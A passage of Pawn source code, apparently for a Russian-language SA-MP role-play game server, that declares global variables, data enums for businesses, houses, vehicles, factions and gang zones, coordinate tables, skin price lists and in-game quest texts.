{2285.507080,2280.904785,10.511699,269.090911},
{2285.562255,2235.384033,10.524499,184.108001},
{2360.915527,2230.779541,10.444999,268.392913},
{2455.693115,2231.645507,10.352600,270.750213},
{2549.270507,2230.461914,10.353400,267.290588},
{2629.929687,2240.506347,10.353400,315.568786},
{2630.612548,2285.944824,10.416999,349.466094},
{2701.096923,2291.357177,13.222100,268.838195},
{2779.824951,2291.976318,10.374099,273.239990},
{2837.809814,2291.172119,10.377499,265.847503},
{2844.668212,2219.919921,10.353400,181.073806},
{2845.145263,2148.848876,10.357299,176.447006},
{2844.466552,2095.038085,10.361000,178.252197},
{2844.317138,2010.652954,10.353400,176.182098},
{2797.476318,1959.517578,10.353400,107.041397},
{2707.863281,1955.620117,13.388799,90.103401},
{2616.687744,1955.455566,10.391300,90.103500},
{2540.705810,1955.314575,10.352399,90.115501},
{2505.624023,1917.606201,10.353400,180.897399},
{2505.812500,1815.905883,10.413000,180.908294},
{2505.399902,1714.985107,10.529899,181.267105},
{2546.651855,1706.427734,10.353400,184.451599},
{2547.149414,1624.539916,10.354999,184.958801},
{2583.068359,1611.334350,10.353400,269.165008},
{2604.386718,1553.845581,10.357500,180.356903},
{2604.836914,1477.964843,10.480199,179.935806},
{2631.192871,1472.163818,10.515000,266.373901},
{2684.681152,1371.298461,6.571199,215.715896},
{2708.193847,1257.476074,6.419700,179.100296},
{2707.298095,1138.789428,6.415999,179.156799},
{2696.590820,1051.978027,6.415900,163.364807},
{2630.389160,938.239013,6.416100,139.529098},
{2549.567871,879.005493,6.415900,116.182403},
{2434.890136,854.596801,6.415900,91.346199},
{2337.633056,854.054321,6.415999,90.538200},
{2177.814453,854.332092,6.415999,90.038497},
{2079.211181,854.265686,6.414500,90.039398},
{1963.264526,854.184997,6.415999,90.039199},
{1848.059570,854.105224,9.352600,90.040496},
{1753.323486,854.038818,9.565799,90.042503},
{1640.931640,853.955322,6.422200,90.041801},
{1537.370605,853.879699,6.494100,90.041801},
{1417.271728,854.791320,6.495500,90.097099},
{1247.959838,963.140686,6.493999,25.795099},
{1227.415039,1063.783691,6.497799,359.921600},
{1227.528686,1144.069458,6.494100,359.922912},
{1227.611816,1205.854370,6.501699,359.922912},
{1228.898193,1288.511352,6.423200,359.211486}
};
new Menu:Inta;
new Text:gSatellite[9];
new PlayerText:pSatellite[MAX_PLAYERS][5];
new cell[25];
//new cell2[13];
new bool: sms,bool: zvon;
new PlayerText:PriceText;
new bool:PhoneLock[MAX_PLAYERS];
new NarkSklad;
new Text3D:NarkText1;
new FracLock[18];
new NarkBot;
new Text3D:NarkText;
new Product[MAX_VEHICLES];
new Prod;
new RolikBot;
new Text3D:RolikText;
new PoliceBot[2];
new Text3D:PoliceText[2];
new gunpic[7];
new pickmeria[4];
new checkmap[2];
new armygunsp;
new armylichsp[5];
new Float:taxipos[MAX_PLAYERS][3];
new Float:carpos[MAX_PLAYERS][3];
new CheckSMS[MAX_PLAYERS];
new BigEar[MAX_PLAYERS];
//new lspd[2];
//new LicBot;
//new Text3D:LicText;
new Text3D:PovarText;
new PovarBot;
new Text3D:ShveiText;
new ShveiBot;
new PovarPic;
enum komi
{
	id,
	kOwner[32],
	kOplata,
	Float:kX,
	Float:kY,
	Float:kZ,
	kbiz,
	Text3D:kText,
	kNum,
	kvirt
};
new KomInfo[500][komi];
new TOTALKOM;
new RobBot,Text3D:RobText;
static const Float:JailPos[16][4] = {
{7.1788,-17.4095,1999.5859,99.6682}, // 1
{7.4426,-21.2952,1999.5859,91.5214}, // 2
{7.7295,-25.2896,1999.5859,94.3414}, // 3
{7.7897,-29.4434,1999.5859,94.9681}, // 4
{-7.9012,-29.6230,1999.5859,271.9797}, // 5
{-7.6246,-25.5179,1999.5900,264.4596}, // 6
{-8.0489,-21.8799,1999.5900,279.4998}, // 7
{-7.6036,-17.4579,1999.5900,261.3263}, // 8
{-7.8334,-17.5593,2003.0758,274.1731}, // 9
{-7.8296,-21.4916,2003.0758,271.9798}, // 10
{-7.6704,-25.7683,2003.0740,274.7999}, // 11
{-7.6262,-29.9655,2003.0740,276.6799}, // 12
{7.7584,-29.4709,2003.0740,95.5715}, // 13
{7.7866,-25.8699,2003.0740,88.9915}, // 14
{7.6145,-21.3631,2003.0758,87.1115}, // 15
{7.0090,-17.2245,2003.0758,88.3648} // 16
};
static const Float:KPZPos[4][4] = {
{1994.5060,1348.3597,1015.4706,87.8485},
{1994.3461,1342.9346,1015.4706,89.1018},
{1991.1337,1339.9432,1015.4706,2.9343},
{1986.3857,1340.1393,1015.4706,2.9343}
};
static const Float:upokovka[][4] = {
{2866.8511,-1202.1423,1027.8796,93.0060}, // 1
{2864.3528,-1202.1104,1027.8748,84.8593}, // 2
{2861.8508,-1202.1494,1027.8748,89.5594}, // 3
{2859.3516,-1202.0939,1027.8796,87.3660}, // 4
{2861.8506,-1204.2633,1027.8748,86.7160}, // 5
{2864.3513,-1204.2390,1027.8748,84.8125}, // 6
{2866.8516,-1204.1508,1027.8796,88.2358}, // 7
{2858.4585,-1209.6355,1028.0563,0.1883}, // 8
{2858.5002,-1212.1355,1028.0563,353.2715} // 9
};
static const Float:LicTest[91][4] = {
{1039.1476,1301.7373,10.3875,177.9792}, // 1
{1038.9214,1257.3810,10.3857,179.3671}, // 1
{1038.4063,1210.7583,10.3848,179.3671}, // 1
{1075.8379,1207.9631,10.3828,273.2050}, // 1
{1101.1516,1211.0271,10.3848,317.4881}, // 1
{1097.0659,1217.3727,10.3849,47.8581}, // 1
{1098.6912,1223.9918,10.3851,314.2221}, // 1
{1098.2474,1230.1273,10.3851,42.3686}, // 1
{1098.3118,1237.5392,10.3861,317.2136}, // 1
{1098.1017,1245.3080,10.3878,32.2711}, // 1
{1098.8619,1254.1227,10.3879,314.9193}, // 1
{1097.7764,1261.1927,10.3877,36.2863}, // 1
{1098.8297,1267.5623,10.3872,320.3324}, // 1
{1098.1377,1273.7596,10.3877,50.0497}, // 1
{1098.2521,1283.7207,10.3879,287.2294}, // 1
{1107.3107,1267.8860,10.3878,178.7686}, // 1
{1107.2620,1248.0477,11.8819,180.0167}, // 1
{1107.0950,1220.9761,10.3826,181.0866}, // 1
{1094.0632,1209.2649,10.3849,90.3084}, // 1
{1070.2955,1208.9215,10.3848,90.2684}, // 1
{1067.2750,1238.7050,10.3847,359.1967}, // 1
{1067.1926,1274.6660,10.3858,359.7215}, // 1
{1067.3054,1297.7972,10.3858,359.7206}, // 1
{1067.4397,1325.3510,10.3858,359.7205}, // 1
{1067.5901,1356.1810,10.3857,359.7204}, // 1
{1065.0416,1375.3083,10.4881,23.5127}, // 1a
{1010.6396,1385.5851,10.3762,1.5834}, // 1a
{1009.9659,1500.4442,10.3745,359.0968}, // 1a
{1010.3127,1635.8549,10.4765,359.4151}, // 1a
{1008.6180,1758.4712,10.4760,1.2979}, // 1a
{1009.5286,1809.1067,10.5067,357.0672}, // 1a
{1058.7252,1810.9036,10.3744,270.5600}, // 1a
{1130.8929,1811.6063,10.5471,270.5589}, // 1a
{1227.6222,1810.9493,13.3915,269.6147}, // 1a
{1318.2098,1811.0771,10.3757,279.4970}, // 1a
{1337.6472,1868.4648,10.4467,285.3328}, // 1a
{1457.8501,1871.3607,10.3745,270.0198}, // 1a
{1529.3889,1871.4985,10.3744,270.1712}, // 1a
{1626.7639,1871.8087,10.3745,270.1924}, // 1a
{1700.7822,1872.2942,10.3754,283.0367}, // 1a
{1709.8002,1943.2108,10.3744,359.9352}, // 1a
{1709.2717,2023.6123,10.3766,0.5137}, // 1a
{1709.4425,2116.7061,10.3745,359.6453}, // 1a
{1710.9205,2169.9363,10.5054,346.3921}, // 1a
{1725.4521,2171.2554,10.4989,272.1201}, // 1a
{1729.9772,2237.2039,10.3745,359.6279}, // 1a
{1776.7589,2270.9517,11.8356,271.6857}, // 1a
{1870.0422,2270.9426,10.3734,270.1740}, // 1a
{1927.0352,2271.1182,10.4199,270.2791}, // 1a
{1929.8057,2384.0242,10.3745,358.2844}, // 1a
{2027.5759,2390.7581,10.5181,269.5176}, // 1a
{2028.3278,2500.2810,10.6104,0.1913}, // 1a
{2029.6527,2558.9214,13.6435,358.7554}, // 1a
{2029.5382,2645.3103,10.5104,1.8308}, // 1a
{1961.8954,2646.7432,10.3745,88.8519}, // 1a
{1911.0538,2665.9448,10.3744,359.2898}, // 1a
{1909.6311,2712.2158,10.4981,1.0049}, // 1a
{1769.3579,2714.2876,10.3744,90.0524}, // 1a
{1688.5520,2731.7383,10.5301,358.3380}, // 1a
{1550.5908,2735.1602,10.4844,91.0098}, // 1a
{1543.5718,2690.3455,10.3747,181.3366}, // 1a
{1580.6726,2677.1987,10.3752,267.4207}, // 1a
{1584.5027,2619.7734,10.3895,176.3487}, // 1a
{1585.4000,2594.8616,10.5006,179.1384}, // 1a
{1478.9209,2592.1987,10.7118,88.8773}, // 1a
{1475.3131,2498.4543,12.1187,181.4081}, // 1a
{1476.0482,2397.9880,10.5197,179.5654}, // 1a
{1554.7097,2390.9104,10.3744,268.6048}, // 1a
{1565.3253,2320.7107,10.4095,179.2967}, // 1a
{1565.4833,2186.3772,10.3745,180.1677}, // 1a
{1532.8190,2175.8564,10.3749,94.4273}, // 1a
{1525.7037,2083.6304,10.3745,179.1038}, // 1a
{1542.1768,2051.5496,10.3742,263.2462}, // 1a
{1564.7272,2040.0090,10.3744,180.2896}, // 1a
{1564.8566,1981.9995,10.3784,178.9662}, // 1a
{1489.0637,1975.8855,10.4702,90.0602}, // 1a
{1485.1604,1919.1193,10.3745,180.3074}, // 1a
{1485.3612,1877.5488,10.5171,180.1198}, // 1a
{1381.6078,1874.8143,10.4739,89.7724}, // 1a
{1326.1285,1864.2894,10.3744,154.2602}, // 1a
{1304.3246,1815.7228,10.5055,88.3896}, // 1a
{1210.1765,1815.3390,13.4676,89.5637}, // 1a
{1092.6693,1815.5198,10.3741,89.5035}, // 1a
{1007.3259,1815.0007,10.5361,90.6056}, // 1a
{1005.6432,1722.6832,10.4760,180.3677}, // 1a
{1005.3632,1528.0985,10.3745,180.1708}, // 1a
{1003.6730,1373.2642,10.4273,177.7906}, // 1a
{1064.7188,1371.0604,10.5242,269.0731}, // 1a
{1067.4324,1298.5364,10.3857,180.2437}, // 1a
{1065.1263,1283.6730,10.3883,174.2442}, // 1a
{1043.3464,1283.6141,10.3866,87.3783} // 1a
};
new Text:Speedometr[29];
new PlayerText:SpeedometrP[7][MAX_PLAYERS];
//new samol,samol1,zdan;
new ctable[MAX_PLAYERS][20];
enum cjob
{
	jid,
	Float:jX,
	Float:jY,
	Float:jZ,
	Float:jFa,
	jbiz,
	jcar,
	jcarpr,
	jcolor1,
	jcolor2,
	jidcar
};
new CarJob[131][cjob];
new TOTALCJ;
new pespic;
new BotGruz;
new BotPes;
new Text3D:TextPes;
new MeriaBot;
new torgpic,blacktorgpic;


new Text3D:MeriaText;
new Text3D:TextGruz;

new BankBot[sizeof(BankBots)];
new Text3D:BankText[sizeof(BankBots)];
new BankSp[sizeof(BankBots)];
new TOTALV;

new Text3D:TextOrg[9];

new BityPic[4];
new FracDrugs[17];
new pobject[100];
new pobjectid[100];
new rentcar[2];
new TOTALBIZ;
new BIZPIC[MAX_BIZ];
new Text3D:BizzLable[MAX_BIZ];
new BIZBOT[MAX_BIZ];
new mebelshopbot;
new Text3D:mebelshoptext;
new Text3D:BotLable[MAX_BIZ];
new Text3D:BotLable1[MAX_BIZ];
new PlayerText:Progress[MAX_PLAYERS][5];
new progress[MAX_PLAYERS];
new progressb[MAX_PLAYERS];
//==================
new hotelvirt[2][2] = {
	{1,2},
	{3,4}
};
static hotelpic[4],parkingzone[4];
static pickuplift[4];
static hotelpic1[4];
//new shkola;


//========================

enum binfo
{
	Float:bX,
	Float:bY,
	Float:bZ,
	Float:bXX,
	Float:bYY,
	Float:bZZ,
	Float:bXX1,
	Float:bYY1,
	Float:bZZ1,
	bInt,
	bMafia,
	bTill,
	bWar,
	bWarTime,
	bZakaz,
	bZakazM,
	bZakazMest,
	bMoney,
	bUl[5],
	bZvuk,
	bProd,
	bMen[32],
	bZeml,
	bName[32],
	bCash,
	bOwner[32],
	bLock,
	bLockTime,
	bMafiaM,
    bOhr,
    bVhod,
	bNapad,
	bPrice,
	bType,
	bCashAll,
	bAkc,
	bAkcAll,
	bAkcP,
	bIcon
};
new BizInfo[MAX_BIZ][binfo];

#define COLOR_BLUE 			0x33AAFFFF
new VehicleNameS[][] =
{
  "Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial", "Sentinel", "Dumper", "Firetruck", "Trashmaster",
  "Stretch", "Manana", "Infernus", "Voodoo", "Pony", "Mule", "Cheetah", "Ambulance", "Leviathan", "Moonbeam",
  "Esperanto", "Taxi", "Washington", "Bobcat", "Whoopee", "BF Injection", "Hunter", "Premier", "Enforcer",
  "Securicar", "Banshee", "Predator", "Bus", "Rhino", "Barracks", "Hotknife", "Trailer", "Previon", "Coach",
  "Cabbie", "Stallion", "Rumpo", "RC Bandit", "Romero", "Packer", "Monster", "Admiral", "Squalo", "Seasparrow",
  "Pizzaboy", "Tram", "Trailer", "Turismo", "Speeder", "Reefer", "Tropic", "Flatbed", "Yankee", "Caddy", "Solair",
  "Berkley's RC Van", "Skimmer", "PCJ-600", "Faggio", "Freeway", "RC Baron", "RC Raider", "Glendale", "Oceanic",
  "Sanchez", "Sparrow", "Patriot", "Quad", "Coastguard", "Dinghy", "Hermes", "Sabre", "Rustler", "ZR-350", "Walton",
  "Regina", "Comet", "BMX", "Burrito", "Camper", "Marquis", "Baggage", "Dozer", "Maverick", "News Chopper", "Rancher",
  "FBI Rancher", "Virgo", "Greenwood", "Jetmax", "Hotring", "Sandking", "Blista Compact", "Police Maverick",
  "Boxvillde", "Benson", "Mesa", "RC Goblin", "Hotring Racer A", "Hotring Racer B", "Bloodring Banger", "Rancher",
  "Super GT", "Elegant", "Journey", "Bike", "Mountain Bike", "Beagle", "Cropduster", "Stunt", "Tanker", "Roadtrain",
  "Nebula", "Majestic", "Buccaneer", "Shamal", "Hydra", "FCR-900", "NRG-500", "HPV1000", "Cement Truck", "Tow Truck",
  "Fortune", "Cadrona", "FBI Truck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer", "Remington", "Slamvan",
  "Blade", "Freight", "Streak", "Vortex", "Vincent", "Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder",
  "Primo", "Cargobob", "Tampa", "Sunrise", "Merit", "Utility", "Nevada", "Yosemite", "Windsor", "Monster", "Monster",
  "Uranus", "Jester", "Sultan", "Stratum", "Elegy", "Raindance", "RC Tiger", "Flash", "Tahoma", "Savanna", "Bandito",
  "Freight Flat", "Streak Carriage", "Kart", "Mower", "Dune", "Sweeper", "Broadway", "Tornado", "AT-400", "DFT-30",
  "Huntley", "Stafford", "BF-400", "News Van", "Tug", "Trailer", "Emperor", "Wayfarer", "Euros", "Hotdog", "Club",
  "Freight Box", "Trailer", "Andromada", "Dodo", "RC Cam", "Launch", "Police Car", "Police Car", "Police Car",
  "Police Ranger", "Picador", "S.W.A.T", "Alpha", "Phoenix", "Glendale", "Sadler", "Luggage", "Luggage", "Stairs",
  "Boxville", "Tiller", "Utility Trailer"
};
stock Float:GetDistanceBetweenPlayers(p1,p2)
{
	new Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2;
	GetPlayerPos(p1,x1,y1,z1);
	GetPlayerPos(p2,x2,y2,z2);
	return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}
#define MAX_SLOT_FURNITURE 30
new PlayerText:ProgressBarP[2][MAX_PLAYERS];
new Text:ProgressBar[11];
enum Furn_Data
{
	mobjid,
	mmodel,
	mcena,
	Float:mx,
	Float:my,
	Float:mz,
	Float:mrx,
	Float:mry,
	Float:mrz
}
new MebelInfo[MAX_SLOT_FURNITURE][1000][Furn_Data];
new admincar[MAX_PLAYERS][101];
#define MAX_GZONE 167
new TOTALGZ;
new ZoneBat[MAX_GZONE];
enum Ganginfa
{
	capture,
	score,
	gangnumber,
	terid,
	stop
}
new CaptInfo[9][Ganginfa];
//new Text:CaptGl[2];
enum GzoneInfo
{
	id,
Float:gCoords[4],
	gFrak,
	gCapture,
	gSp,
	gNapad
}
new GZInfo[MAX_GZONE][GzoneInfo];
new pered;
new zavodpic;
// =================== БАНКОМАТЫ ================
#define TABLE_BANK "bank"
enum bkinfo
{
	id,
	Float:bX,
	Float:bY,
	Float:bZ,
	Float:bXX,
	Float:bYY,
	Float:bZZ,
	Text3D:bLab,
	bObj
}
new BankInfo[100][bkinfo];
new TOTALBANK;
//=========== ДОМА =========================
new PlayerText:SkinsTD[MAX_PLAYERS][15];
new TOTALHOUSE;
#define MAX_HOUSE 1000
enum hinfo
{
	id,
	hOwner[32],
	Float:hX,
	Float:hY,
	Float:hZ,
	Float:hXX,
	Float:hYY,
	Float:hZZ,
	hTax,
	hInt,
	hVirt,
	Float:hGar[3],
	Float:hFa,
	Text3D:hGarText,
	hClass[10],
	hZasel1[32],
	hZasel2[32],
	hZasel3[32],
	hZasel4[32],
	hCost,
	hHeal,
	Float:hShkafFA,
	hRot,
	Float:hShkafX,
	Float:hShkafY,
	Float:hShkafZ,
	hUl[3],
	hPick,
	hMap,
	hOplata,
	hInvSlot[72],
	hInvKol[72],
	hLock
};
new HInfo[MAX_HOUSE][hinfo];
//==========
enum v1Info
{
	id,
	vmodel,
	vobj1,
	vfam,
	Float:vx,
	Float:vy,
	Float:vxmag,
	Float:vymag,
	Float:vzmag,
	Float:vfmag,
	vint,
	vsis,
	vvirt,
	vfuel,
	Float:vz,
	Float:vfa,
	vcost,
	vname[24],
	vcolor1,
	vcolor2,
	vsvet,
	vtunings[100],
	vtuning[14],
	vkeys,
	vprob,
	vtext,
	voplata,
	vnumber[10],
	vsing,
	vcar

};

new WomenSkin[15][2] = { //0 16
{95,12},
{95,13},
{110,40},
{111,41},
{270,55},
{290,90},
{300,91},
{350,93},
{380,152},
{420,192},
{450,214},
{500,216},
{700,219},
{900,233},
{1000,263}
};

new MenSkin[44][2] = { // 0 43
{95,2},
{95,7},
{110,14},
{110,15},
{270,17},
{270,20},
{290,29},
{300,33},
{310,46},
{345,59},
{400,82},
{420,83},
{430,84},
{500,147},
{520,156},
{600,162},
{620,167},
{700,176},
{730,171},
{790,177},
{830,185},
{900,181},
{930,186},
{970,189},
{1000,221},
{1050,222},
{1070,223},
{1400,228},
{1600,240},
{1690,241},
{1700,242},
{2000,249},
{2400,258},
{2600,259},
{2900,264},
{3200,289},
{3500,290},
{3700,291},
{3720,292},
{3800,293},
{3860,294},
{3880,295},
{3900,296},
{4000,297}
};


new Text3D:CarLable[MAX_VEHICLES];
new VInfo[500][v1Info];
#define MAX_VCARS 500
enum vInfo
{
	id,
	vModel,
	vColors[16],
	vColor[2],
Float:vX,
Float:vY,
Float:vZ,
Float:vFa,
	vInt,
	vWorld,
	vVehicle,
	vFr,
	vFuel,
	vCost
};
new GZSafeTime[MAX_GZONE];

new VehInfo[MAX_VCARS][vInfo];
new Float:PlX,Float:PlY,Float:PlZ,Float:PANGLE,avirt,aint;
new gtp,gtph;
new coordv[90];
new TOTALFRAC;
new healpic[3];
new secupdate;
new bool:Engine[MAX_VEHICLES];
new bool:Lights[MAX_VEHICLES];
new bool:Capot[MAX_VEHICLES];
new bool:Trunk[MAX_VEHICLES];
new bool:Okna[MAX_VEHICLES][4];

new bool:IsLocked[MAX_VEHICLES];
new Locked[MAX_VEHICLES] = -1;
//new raund;
new RentCar[MAX_VEHICLES] = -1;
new oldpickup[MAX_PLAYERS];



new serverveh[MAX_VEHICLES];
new	saveacc;
new	koleso;

new Float:PickupX[MAX_PLAYERS],Float:PickupY[MAX_PLAYERS];
#define MAX_FRACTION 18
new FracPic[9];
new WorkPic[10];
new bool:FracUval[MAX_FRACTION];
new ManSkinFrack[17][13] = {
	{255,17,98, 290, 227,150,148,147}, // meria
	{280,284,282,266,306,265}, //pd
	{163,164,  286, 295, 166,141,216,165}, //fbi
	{308, 70, 274, 275, 276,219, 276}, //bolka
	{189, 194, 240, 98}, // ash
	{105,106,107,271,195,270}, //grov
	{28,103,102,104,13},  //ballas
	{30,48,174,175,41,173}, //rifa
	{47,114,116, 115,65,292}, //aztecas
	{108,184,110,109,90,273}, //vagos
	{100, 247, 248, 192, 207}, //bikers
	{127, 124, 3, 223, 258, 98, 93}, //lcn
	{118, 120, 122, 123, 294, 186, 208, 263,169 }, //yakuza
	{290, 111, 112, 113, 233, 303, 46}, //rm
	{61, 191, 295, 287, 179}, //army
	{60, 126, 141, 188, 217}, //cnn
	{280,284,282,266,306,265 } //lspd
};



new TOTALVEH;
// int virt
new SpawnIn[17][2] = {
	{33,55}, //mayor
	{3,1}, //lvpd
	{35,66}, //fbi
	{2,3}, //hospital
	{1,1}, //lic
	{8,6}, //415 block
	{8,7}, //ballas
	{8,16}, //rifa
	{5,9}, //centro side
	{8,10}, //vagos
	{11,8}, //bikers
	{5,12}, //lcn
	{5,13}, //triad
	{5,14}, //rm
	{45,50}, //cnn
	{55,3}, //army
	{3,17} //lspd
};
new Float:SpawnFrac[17][4] = {
	{1413.4548,-38.2550,1000.9143,93.6265}, //mayor
	{2020.7133,1385.8605,3017.1025,93.7083}, //lvpd
	{1386.5930,-39.3953,1000.9143,356.9926}, //fbi
	{1417.0569,1.4503,1000.9133,181.7014}, //hospital
	{1745.0341,-1346.2164,1569.0170,154.5246}, //lic
	{-199.2227,98.0093,-26.6271,142.9883}, //grove
	{-199.2227,98.0093,-26.6271,142.9883}, //ballas
	{-199.2227,98.0093,-26.6271,142.9883}, //rifa
	{-199.2227,98.0093,-26.6271,142.9883}, //aztecas
	{-199.2227,98.0093,-26.6271,142.9883}, //vagos
	{507.7828,-73.7753,998.7578,60.5264}, //bikers
	
	
	{1948.2615,284.2386,1374.9434,230.8956}, //lcn
	{1948.2615,284.2386,1374.9434,230.8956},//triad
	{1948.2615,284.2386,1374.9434,230.8956}, //rm
	{1368.4231,-21.4398,1000.9173,182.2305}, //cnn
	{9.6180,-7.5014,1999.9159,114.3502}, //army
	{2020.7133,1385.8605,3017.1025,93.7083} //lspd
};
new Text3D:sam[2];
new objectsam[2];
static mat;
static samolet[2];
static bullet__fire1[MAX_PLAYERS];
static bullet__fire2[MAX_PLAYERS];
static gun__ignore[MAX_PLAYERS];
enum fInfo
{
	id,
	fName[32],
	fLeader[32],
	fCapt,
	fMSkins[60],
	fMSkin[10],
	fNabor,
	fNaborText[60],
	Float:fNaborPos[3],
	fWSkin,
	fPayDay,
	fPayDays[128]
};
enum wInfo
{
    pAmmo,
    pWeapon
}
new GunInfo[MAX_PLAYERS][wInfo][13];
enum ff
{
	id,
	fLeader[32],
	fKazna,
	fHouse,
	fShkaf,
	fUl[4],
	fColor,
	fName[50]
}
new FamInfo[100][ff];

new TOTALFAM;
new turpic[4];
enum PickInfo{
Float: PickX,
Float: PickY,
Float: PickZ}
new PickupInfo[MAX_PICKUPS][PickInfo];

new FracInfo[MAX_FRACTION][fInfo];
new FracRank[MAX_FRACTION][11][32];
new FracBank[MAX_FRACTION];
new FracMats[MAX_FRACTION];
new FracPay[MAX_FRACTION][11];
new bool:PlayerLogged[MAX_PLAYERS] = false;
#define TABLE_ENTERS       "enters"
new TOTALENTERS;

new coordc[90];
#define MAXENTERS 150
enum eInfo
{
	id,
Float:pX,
Float:pY,
Float:pZ,
	pM,
	pT,
	pI,
	pV,
Float:ptX,
Float:ptY,
Float:ptZ,
Float:ptFa,
	ptI,
	ptV,
	pP,
	pMem
};
new EntersInfo[MAXENTERS][eInfo];
new Text:ShowMap[8];

#define L_AVTO 0
#define L_MOTO 1
#define L_VOD 2
#define L_VOZ 3
#define L_GUN 6
#define L_GRUZ 5
#define L_BUS 4

enum binf
{
	bankID,
	bankCash
};
new BanksInfo[MAX_PLAYERS][binf][10];
new BanksName[MAX_PLAYERS][10][64];

new MAX_PROD[MAX_BIZ];
enum prodx
{
    prodCena,
    prodMinus
};
new ProdInfo[MAX_BIZ][prodx][13];
new ProdNames[MAX_BIZ][13][64];
static ProdCena[][] = {
{650,700,2000,6000,6500,8000,9500,500,1500,0,0,0},
{300,150,550,400,600,300,1000,500,850,150,200,0},
{80,200,320,400,110,0,0,0,0,0,0,0},
{80,200,320,400,110,0,0,0,0,0,0,0},
{50,120,339,359,379,399,0,0,0,0,0,0},
{50,120,339,359,379,399,0,0,0,0,0,0},
{50,120,339,359,379,399,0,0,0,0,0,0},
{80,200,320,400,110,0,0,0,0,0,0,0},
{0,0,0,0,0,0,0,0,0,0,0,0},
{20,0,0,0,0,0,0,0,0,0,0,0},
{0,0,0,0,0,0,0,0,0,0,0,0},
{900,0,0,0,0,0,0,0,0,0,0,0},
{900,0,0,0,0,0,0,0,0,0,0,0},
{50,120,339,359,379,399,200,200,120,280,280,400}
};
new TOTALBANKS[MAX_PLAYERS];
#define C_KILLS 	0
#define C_DEATH 	1
#define C_AM 		2
#define C_CAPTURE 	3
#define C_MATS 		4
#define C_DRUGS 	5
#define C_CR 		6
#define C_CRT 		7
new PlayerQuest[MAX_PLAYERS][20][6];
enum qst
{
	qName[40],
	qInfo[600],
	qMoney,
	qExp
}

new QuestInfo[20][qst] = {
	//основное
	{"Документы","{ffffff}Получить паспрорт:\t{f7ae11}%s{ffffff}\nПолучить паспорт можно в Мэрии: {f7ae11}(/gps » Основное » Мэрия){ffffff}\n\nПолучить карту:\t{f7ae11}%s{ffffff}\n\
		Получить карту можно в основном отделении банка: {f7ae11}(/gps » Основное » Банк)",50,1}, // 0
	{"Первая зарплата","{ffffff}Перетащить 10 мешков с песком:\t{f7ae11}[%d/10]{ffffff}\n\
		Собрать 10 аптечек:\t\t\t{f7ae11}[%d/10]{ffffff}\n\
		Перетащить 10 ящиков:\t\t{f7ae11}[%d/10]{ffffff}\n\
		Приготовить 10 блюд:\t\t\t{f7ae11}[%d/10]{ffffff}\n\n\
		Используйте: {f7ae11}(/gps » Работы){ffffff}",100,1}, // 1
	{"Вещи первой необходимости","{ffffff}Купить телефон:\t{f7ae11}%s{ffffff}\nПриобрести телефон можно в 24/7: {f7ae11}(/gps » Ближайшие места » Ближайший магазин 24/7){ffffff}\n\n\
		Купить часы:\t\t{f7ae11}%s{ffffff}\nПриобрести телефон можно в 24/7: {f7ae11}(/gps » Ближайшие места » Ближайший магазин асессуаров)",150,1}, //2
	{"Получение прав","{ffffff}Получите права любой категории:\t{f7ae11}%s{ffffff}\nПолучить права можно в автошколе: {f7ae11}(/gps » Основное » Автошкола)",
		100,2}, // 3
	{"Работа на транспорте","{ffffff}Проездить 3 рейса на автобусе:\t{f7ae11}[%d/3]{ffffff}\n\
		Починить 5 машин:\t\t\t{f7ae11}[%d/5]{ffffff}\n\
		Отвезти продукты в 3 бизнеса:\t{f7ae11}[%d/3]{ffffff}\n\
		Почистить весь город:\t{f7ae11}%s{ffffff}\n\
		Собрать мусор из 15 баков:\t\t{f7ae11}[%d/15]{ffffff}\n\
		Перевезти 3 груза:\t\t\t{f7ae11}[%d/3]{ffffff}\n\n\
		Используйте: {f7ae11}(/gps » Работы)",200,2}, // 4
	{"Новая одежда","{ffffff}Купить новую одежду:\t{f7ae11}%s{ffffff}\nКупить одежду можно в магазине одежды: {f7ae11}(/gps » Ближайшие места » Ближайший магазин одежды)",
		100,1}, // 5
	{"Жилье","{ffffff}Купить дом любого класса:\t{f7ae11}%s{ffffff}",5000,3}, // 6
	{"Транспорт","{ffffff}Купить транспорт любого класса:\t{f7ae11}%s{ffffff}",2000,3}, // 7
	{"Вступить в организацию","{ffffff}Вступите в любую организацию:\t{f7ae11}%s{ffffff}\nДля информации о наборах используйте:: {f7ae11}(/join)",1000,2}, // 8
	{"Война","{ffffff}Начать войну за территорию/бизнес:\t{f7ae11}%s{ffffff}",100,1}, // 9
	{"Убийца","{ffffff}Совершить убийство на войне/стреле:\t{f7ae11}%s{ffffff}",200,1}, // 10
	{"Вандал","{ffffff}Закрасить 10 граффити:\t{f7ae11}[%d/10]{ffffff}",300,1}, // 11
	{"Угонщик","{ffffff}Выполнить все заказы по угону:\t{f7ae11}%s{ffffff}",500,1}, // 12
	{"Доставка к дому","{ffffff}Выгрузить 3000 материалов на базу организации:\t{f7ae11}[%d/3000]{ffffff}\nВыгрузить 3000 наркотиков на базу организации\t\
		{f7ae11}[%d/3000]{ffffff}",600,1}, // 13
	{"Сидевший","{ffffff}Попасть в тюрьму и сшить 5 кофт:\t{f7ae11}[%d/5]{ffffff}\n\nВ тюрьме присутсвует работа швеи Вам необходимо попасть туда",300,1}, // 14
	{"Врач","{ffffff}Вылечить 5 человек:\t{f7ae11}[%d/5]{ffffff}\nВступите  в организацию 'Центральная больница' и вылечите людей",100,1}, // 15
	{"Полицейский","{ffffff}Посадить 3-ех преступников:\t{f7ae11}[%d/3]{ffffff}\nВступите в организацию 'LSPD'/'LVPD'/'FBI' и посадите преступников",100,1}, // 16
	{"Журналист","{ffffff}Проверить 10 объявлений:\t{f7ae11}[%d/10]{ffffff}\nВступите в организацию 'Central News Network' и проверьте объявление",100,1}, // 17
	{"Военный","{ffffff}Перевести 3 раза материалы:\t{f7ae11}[%d/3]{ffffff}\nВступите в организацию 'Армия Зона 51' и проверьте объявление",100,1}, // 18
	{"Адвокат","{ffffff}Выпустить 5 заключенных:\t{f7ae11}[%d/5]{ffffff}\nВступите в организацию 'Мэрия' и выпустите заключенных",100,1} // 19
};
enum pInfo
{
	pID,
	pPassword[80],
	pWarnSkok,
	pWarnDate,
	pLevel,
	pAvig,
	pZavisimost,
	pLomka,
	pAmmo[100],
	pGuns[50],
	pPass,
	pVipis,
